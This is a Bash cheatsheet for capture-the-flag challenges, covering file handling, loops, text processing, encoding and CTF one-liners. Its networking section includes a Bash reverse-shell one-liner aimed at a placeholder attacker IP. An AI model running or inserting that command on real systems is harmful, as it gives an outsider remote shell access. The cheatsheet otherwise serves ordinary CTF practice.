# Bash Cheatsheet for CTFs

A comprehensive README of Bash commands, constructs, and one-liners tailored for Capture The Flag (CTF) challenges. Includes scripting basics, text/file processing, network tricks, and automation.

---

## 🎯 Purpose

This cheatsheet is designed to help quickly write and run Bash scripts during CTFs, covering file parsing, automation, loops, and common one-liners for exploiting, extracting, and analyzing data.

---

## 🔧 Basics

* Print text:

  ```bash
  echo "Hello CTF"
  ```
* Current directory:

  ```bash
  pwd
  ```
* List files:

  ```bash
  ls -la
  ```
* Run script:

  ```bash
  chmod +x script.sh && ./script.sh
  ```

---

## 📂 File Handling

* Create file:

  ```bash
  touch file.txt
  ```
* Read file:

  ```bash
  cat file.txt
  less file.txt
  head -n 10 file.txt
  tail -f file.txt
  ```
* Count lines/words:

  ```bash
  wc -l file.txt
  wc -w file.txt
  ```
* Search inside file:

  ```bash
  grep "flag" file.txt
  grep -r "flag" .
  ```

---

## 🔁 Loops

* Loop over files:

  ```bash
  for file in *; do
      echo "$file"
  done
  ```
* Loop over lines in file:

  ```bash
  while IFS= read -r line; do
      echo "$line"
  done < file.txt
  ```
* Loop with numbers:

  ```bash
  for i in {1..10}; do echo $i; done
  ```

---

## 🔎 Text Processing

* Cut fields:

  ```bash
  cut -d":" -f1 /etc/passwd
  ```
* Sort & unique:

  ```bash
  sort file.txt | uniq -c
  ```
* Replace text:

  ```bash
  sed 's/old/new/g' file.txt
  ```
* Extract with regex:

  ```bash
  grep -oE "flag\{.*\}" file.txt
  ```
* Hex dump:

  ```bash
  xxd file
  ```

---

## 📡 Networking & Exploitation

* Download file:

  ```bash
  wget http://target/file
  curl -O http://target/file
  ```
* Send request:

  ```bash
  curl -X POST -d "param=value" http://target
  ```
* Start simple web server:

  ```bash
  python3 -m http.server 8080
  ```
* Reverse shell (Bash):

  ```bash
  bash -i >& /dev/tcp/attacker_ip/4444 0>&1
  ```

---

## 🔐 Encoding & Decoding

* Base64 encode/decode:

  ```bash
  echo -n "flag" | base64
  echo "ZmxhZw==" | base64 -d
  ```
* Hex to ASCII:

  ```bash
  echo 666c6167 | xxd -r -p
  ```
* ROT13:

  ```bash
  echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
  ```
* Binary to text:

  ```bash
  echo 01100110 | perl -lpe '$_=pack("B*",$_)'
  ```

---

## 🧮 Math & Hashes

* Simple arithmetic:

  ```bash
  echo $((5+3))
  ```
* MD5/SHA1/SHA256:

  ```bash
  echo -n "flag" | md5sum
  echo -n "flag" | sha1sum
  echo -n "flag" | sha256sum
  ```

---

## 🧰 One-Liners for CTFs

* Extract flag pattern from logs:

  ```bash
  grep -roE "flag\{[A-Za-z0-9_]+\}" .
  ```
* Find strings in binary:

  ```bash
  strings binary | grep flag
  ```
* Brute-force numbers:

  ```bash
  for i in {1..1000}; do echo $i; done
  ```
* Loop curl requests:

  ```bash
  for i in {1..10}; do curl http://target/page?id=$i; done
  ```

---

## 📝 Tips

* Always quote variables: `"$var"`
* Use `set -x` to debug scripts
* Redirect output: `command > out.txt 2>&1`
* Combine tools (`grep`, `cut`, `awk`, `sed`) for fast parsing
* Remember `man <command>` and `--help`

---

*This README is optimized for CTF Bash usage — expand with specific payloads, automation tricks, or category-specific scripts as needed.*
